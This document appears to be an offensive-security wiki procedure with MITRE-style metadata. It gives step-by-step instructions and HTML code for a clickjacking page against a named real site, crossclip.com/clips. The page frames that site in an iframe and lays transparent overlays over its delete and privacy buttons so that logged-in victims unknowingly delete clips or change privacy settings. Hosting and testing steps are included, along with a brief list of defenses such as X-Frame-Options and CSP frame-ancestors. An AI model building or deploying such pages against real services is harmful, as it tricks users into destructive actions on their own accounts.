---
tags:
  - clickjacking
  - iframe
  - html-phishing
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:28:05.081Z'
sub_techniques: []
id: ca68a55d-377f-493e-b760-9619a5820448
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Create-Malicious-Clickjacking-HTML-Page

## Summary

This procedure creates a malicious HTML page that embeds the vulnerable Crossclip clips page in an iframe, using transparent overlays to hijack user clicks on sensitive elements like delete or privacy buttons.

## Description

Clickjacking exploits the absence of protections like X-Frame-Options on https://crossclip.com/clips. The attacker crafts an HTML file with a full-size iframe loading the target page, overlaid with invisible divs positioned over actionable buttons. When hosted on an attacker-controlled domain, this deceives users into clicking overlays, which propagate to the iframe. Prerequisites include basic HTML knowledge and a web server for hosting. Outcomes: Unintended actions like clip deletion or privacy changes (e.g., public to private) without user confirmation, as shown in POC videos requiring 1-2 clicks.

## Requirements

1. Text editor to create HTML file
2. Web server to host the malicious page (e.g., local or remote)
3. Knowledge of the target page's UI layout for overlay positioning

## Defense

Defensive measures and detection strategies:

- Add X-Frame-Options: DENY or SAMEORIGIN header to prevent embedding
- Implement frame-busting JavaScript to detect and break out of iframes
- Use Content-Security-Policy (CSP) with frame-ancestors directive
- Monitor for anomalous data modifications in application logs

## Objectives

1. Embed the unprotected clips page in an iframe
2. Position overlays to capture clicks on delete/privacy controls
3. Host the page for victim access

## Instructions

### Step 1: Create Basic HTML Structure

**Context**: Set up the page with an iframe sourcing the vulnerable URL.

Use a text editor to create index.html:

```html
<!DOCTYPE html>
<html>
<head><title>Deceptive Page</title></head>
<body>
<iframe src="https://crossclip.com/clips" frameborder="0" height="1200px" width="1920px" style="opacity: 0.5;"></iframe>
</body>
</html>
```

> This loads the clips page. Expected output: Iframe displays the target content.

### Step 2: Add Transparent Overlays

**Context**: Overlay divs over specific buttons to hijack clicks.

Modify the HTML to include positioned divs (adjust coordinates based on page inspection):

```html
<div style="position: absolute; top: 200px; left: 300px; width: 100px; height: 30px; background: transparent;"></div>
<div style="position: absolute; top: 250px; left: 300px; width: 100px; height: 30px; background: transparent;"></div>
<iframe src="https://crossclip.com/clips" ... ></iframe>
```

> Align overlays with delete/privacy buttons. Expected output: Clicks on overlays interact with iframe elements.

### Step 3: Host and Test

**Context**: Serve the page and verify clickjacking.

Upload to a web server or use a local server (e.g., python -m http.server). Test by logging in and clicking overlays.

> Manual hosting. Expected output: Actions execute in iframe without alerts.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques

- None

## Commands Used

- None

## Tools Used

- Text editor (e.g., VS Code)
- Web server

## Tags

- [[clickjacking]]
- [[ui-manipulation]]
